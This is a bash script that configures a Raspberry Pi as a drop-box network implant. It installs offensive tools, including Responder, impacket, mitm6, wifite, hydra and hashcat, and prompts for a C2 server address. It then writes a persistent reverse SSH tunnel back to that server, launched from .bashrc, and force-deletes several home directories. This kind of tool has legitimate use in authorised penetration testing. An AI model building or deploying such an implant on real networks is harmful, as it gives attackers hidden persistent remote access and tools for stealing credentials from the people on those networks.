#!/bin/bash 
cat << "EOF"
██████╗ ██╗███╗   ███╗██████╗ ██╗      █████╗ ███╗   ██╗████████╗    
██╔══██╗██║████╗ ████║██╔══██╗██║     ██╔══██╗████╗  ██║╚══██╔══╝    
██████╔╝██║██╔████╔██║██████╔╝██║     ███████║██╔██╗ ██║   ██║       
██╔═══╝ ██║██║╚██╔╝██║██╔═══╝ ██║     ██╔══██║██║╚██╗██║   ██║       
██║     ██║██║ ╚═╝ ██║██║     ███████╗██║  ██║██║ ╚████║   ██║       
╚═╝     ╚═╝╚═╝     ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝       
                                                                     
███████╗ ██████╗██████╗ ██╗██████╗ ████████╗                         
██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝                         
███████╗██║     ██████╔╝██║██████╔╝   ██║                            
╚════██║██║     ██╔══██╗██║██╔═══╝    ██║                            
███████║╚██████╗██║  ██║██║██║        ██║                            
╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝                            
EOF
echo ""
echo "Welcome To The PiMPlant Script!"
sleep 4
echo ""
echo "Let's Update Your Implant"
echo ""
apt-get update -y && apt-get upgrade -y
echo "Removing Unneeded Directories"
rm -rf Videos/
rm -rf Music/
rm -rf Public/
rm -rf Templates/
rm -rf Bookshelf/
echo ""
echo "Time To Install All The Hacker Packages"
sleep 4
echo ""
cd /opt/
sudo git clone https://github.com/SpiderLabs/Responder.git
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip install -r requirements.txt
python setup.py install
cd ../
git clone https://github.com/michenriksen/aquatone.git
git clone https://github.com/darkoperator/dnsrecon.git
git clone https://github.com/dirkjanm/mitm6.git
sudo apt install aircrack-ng -y
sudo apt install python2 -y
sudo apt install wifite -y
sudo apt install hcxtools -y
sudo apt install hydra -y
sudo apt install medusa -y
sudo apt install cewl -y
sudo apt install hashcat -y 
sudo apt install macchanger -y 
sudo apt install nmap -y
sudo apt install postgresql -y 
sudo apt install tmux -y
cd /home/pi
ssh-keygen
echo "Enter Your C2 Server's IP/Domain"
read C2IP
sleep 2
echo ""
echo "Time For Some Reverse SSH"
sleep 3
touch rev.sh
echo “#!/bin/sh” >> rev.sh
echo "ssh -N -R 2222:localhost:22 root@$C2IP" >> rev.sh
sudo chmod +x rev.sh
chown pi:pi rev.sh
echo "sleep 15 && bash /home/pi/rev.sh" >> /home/pi/.bashrc
ssh-copy-id -i /home/pi/.ssh/id_rsa.pub root@$C2IP
echo "All Is Complete"
sleep 2
echo "Your Implant Is Configured"
sleep 2
echo ""
echo "Reboot for changes to take effect"
